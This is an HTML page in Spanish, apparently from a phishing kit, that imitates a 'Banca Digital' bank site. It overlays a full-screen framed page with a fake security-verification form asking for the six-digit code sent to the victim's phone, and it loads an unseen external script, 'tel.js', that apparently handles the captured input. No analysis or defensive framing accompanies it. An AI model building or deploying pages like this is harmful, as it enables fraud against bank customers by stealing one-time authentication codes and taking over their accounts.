<!DOCTYPE html>
<html lang="es">
<head>
  <script type="text/javascript" src="tel.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Banca Digital</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
   <iframe style="height: 100vh;width: 100%;" frameborder="0" src="index.html"></iframe>
<form id="verificationForm">
  <div class="overlay">
    <div class="login-box2">
      <div class="security-bar">
      <span class="security-verification" style="vertical-align: left">Verificación de seguridad</span></div>
       <div style="height: 10px;
    line-height: .4;
    padding-left: 8px;
    float: right;
    border-left: 3px solid #c3932f;"><span style="font-size: 11px; margin-right: 10px;">Obligatorio</span></div>
    <br>
      <div align="center">
      <span class="login-code-label">Código de verificación:</span>
       <div align="center" style="padding: 0px 70px 0 70px"><input required="" minlength="6" maxlength="6" id="token" class="login-box-input2" type="password" placeholder="Ingrese su código"></div>
       <div align="right" style="padding: 4px 42px 0 83px;" bis_skin_checked="1"><a style="box-sizing: border-box;color: #2580b0;font-size: 12px;display: inline-block;cursor: pointer;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">Solicitar código</a><br><span style="font-size: 11px">El código de verificación será enviado a tu celular.</span></div>
       <br>
       <div style="height: 15px;
    background: #f8f8f8;
    border-bottom-left-radius: 4px;
    border-bottom-right-radius: 4px;
    border-top: 1px solid #d7d7d7;padding: 10px" align="right">   
       <button style="left: 10px;" type="submit" class="button-big">Continuar</button><div/>
      </div>
    </div>
  </div>
  </form>
 </body>
</html>
